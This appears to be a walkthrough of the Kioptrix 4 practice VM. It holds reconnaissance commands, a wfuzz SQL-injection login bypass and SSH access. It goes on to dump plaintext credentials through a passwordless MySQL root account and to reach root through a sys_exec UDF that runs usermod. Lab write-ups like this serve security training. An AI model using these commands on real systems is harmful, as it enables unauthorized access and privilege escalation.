## NetDiscover:
`netdiscover -r 192.168.58.0/24`


## Nmap:
`nmap -A -vv -T4 192.168.58.133`

```
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAJQxDWMK4xxdEEdMA0YQLblzXV5xx6slDUANQmyouzmobMxTcImV1OfY9vB2LUjJwSbtuPn/Ef7LCik29SLab6FD59QsJKz3tOfX1UZJ9FeoxPhoVsfk+LDM4FbQxo0pPYhlQadVHAicjUnONl5WaaUEYuelAoU36v2wOKKDe+kRAAAAFQDAmqYNY1Ou7o5qEfZx0e9+XNUJ2QAAAIAt6puNENxfFnl74pmuKgeQaZQCsPnZlSyTODcP961mwFvTMHWD4pQsg0j6GlPUZrXUCmeTcNqbUQQHei6l8U1zMO4xFYxVz2kkGhbQAa/FGd1r3TqKXu+jQxTmp7xvNBVHoT3rKPqcd12qtweTjlYKlcHgW5XL3mR1Nw91JrhMlAAAAIAWHQLIOjwyAFvUhjGqEVK1Y0QoCoNLGEFd+wcrMLjpZEz7/Ay9IhyuBuRbeR/TxjitcUX6CC58cF5KoyhyQytFH17ZMpegb9x29mQiAg4wK1MGOi9D8OU1cW/COd/E8LvrNLxMFllatLVscw/WXXTi8fFmOEzkGsaRKC6NiQhDlg==
|   2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApA/UX2iq4JYXncTEDfBoyJWguuDkWDvyw4HlLyc1UBT3Pn2wnYLYa0MjwkBtPilmf5X1zK1z3su7oBEcSEt6o7RzDEUbC1O6nRvY4oSKwBD0qLaIHM1V5CZ+YDtLneY6IriJjHJ0DgNyXalPbQ36VZgu20o9dH8ItDkjlZTxRHPE6RnPiD1aZSLo452LNU3N+/2M/ny7QMvIyPNkcojeZQWS7RRSDa2lEUw1X1ECL6zCMiWC0lhciZf5ieum9MnATTF3dgk4BnCq6dfdEvae0avSypMcs6no2CJ2j9PPoAQ1VWj/WlAZzEbfna9YQ2cx8sW/W/9GfKA5SuLFt1u0iQ==
80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.0.28a (workgroup: WORKGROUP)
```

## Enumeration:

port 80 with a weebpage

![image](https://github.com/user-attachments/assets/f76a88bf-5144-4173-ad5b-ce3be1de6d4f)

Manually checked for stuffs like code inspection, robots file etc...

along with directory busting

![image](https://github.com/user-attachments/assets/7b6947b1-b928-41cc-b11c-aa1d806fab77)

found two users John and Robert

Now, I checked for SQLi, apparently it's working

I used basic SQLi, didn't quite work, so instead I used a method mentioned by Siren in her walkthrough

`wfuzz -c -z file,quick-SQLi.txt -d "myusername=john&mypassword=FUZZ&Submit=Login" --hc 404 http://192.168.58.133/checklogin.php`

pretty simple, 
wfuzz is a web fuzzing tool

`-z` specifies the payload sources while `file` commands to use each line of the given file

`-d "myusername=john&mypassword=FUZZ&Submit=Login"` sends the payload in POST request where `-d` stands for data

`FUZZ` is replaced with each line from `quick-SQLi.txt`

`--hc 404` ignores responses with status code 404

`http://192.168.58.133/checklogin.php` is the target URL


Got the required response

now using one of the results `'*'` along with username `john` leads us to 

![image](https://github.com/user-attachments/assets/45c3b6c5-5231-46e8-abc7-d5ade8332f80)

![image](https://github.com/user-attachments/assets/7317049f-689c-444a-99d0-0bb781e8e3b2)

Boom, now we ssh

![image](https://github.com/user-attachments/assets/2f2714a1-51ad-4843-a28b-c44d19ac5f3f)

We face an issue but

![image](https://github.com/user-attachments/assets/dbda825c-f91c-41a2-bb38-3e5de66c9579)

we get the tty using echo

![image](https://github.com/user-attachments/assets/a16be71a-090f-4926-b4c5-78afa206e52f)

No sudo apparently

![image](https://github.com/user-attachments/assets/80c00d26-b9c4-4af0-aa84-a2e56217c817)

snooping around;

![image](https://github.com/user-attachments/assets/1e5aa2dc-1592-4cfc-b2a2-c2c1a4c58a27)

no password for mysql root

## MySQL:

```
john@Kioptrix4:/var/www$ mysql -uroot
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 95
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> show databases; 
+--------------------+
| Database           |
+--------------------+
| information_schema | 
| members            | 
| mysql              | 
+--------------------+
3 rows in set (0.00 sec)

mysql> use members;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-------------------+
| Tables_in_members |
+-------------------+
| members           | 
+-------------------+
1 row in set (0.00 sec)

mysql> select * from members;
+----+----------+-----------------------+
| id | username | password              |
+----+----------+-----------------------+
|  1 | john     | MyNameIsJohn          | 
|  2 | robert   | ADGAdsafdfwt4gadfga== | 
+----+----------+-----------------------+
2 rows in set (0.00 sec)

mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------------+
| Tables_in_mysql           |
+---------------------------+
| columns_priv              | 
| db                        | 
| func                      | 
| help_category             | 
| help_keyword              | 
| help_relation             | 
| help_topic                | 
| host                      | 
| proc                      | 
| procs_priv                | 
| tables_priv               | 
| time_zone                 | 
| time_zone_leap_second     | 
| time_zone_name            | 
| time_zone_transition      | 
| time_zone_transition_type | 
| user                      | 
+---------------------------+
17 rows in set (0.00 sec)

mysql> select * from func;
+-----------------------+-----+---------------------+----------+
| name                  | ret | dl                  | type     |
+-----------------------+-----+---------------------+----------+
| lib_mysqludf_sys_info |   0 | lib_mysqludf_sys.so | function | 
| sys_exec              |   0 | lib_mysqludf_sys.so | function | 
+-----------------------+-----+---------------------+----------+
2 rows in set (0.00 sec)
```

In the last command, we see `sys_exec              |   0 | lib_mysqludf_sys.so | function ` a custom library which is providing system command execution
taking this advantage, we can now use `SELECT sys_exec('usermod -a -G admin john');`
This Linux command via MySQL is to add the user john to the admin group (potentially granting sudo/root access).

![image](https://github.com/user-attachments/assets/45cdd088-86e3-4857-bd8e-aede6c5b9ea0)

Boom root.








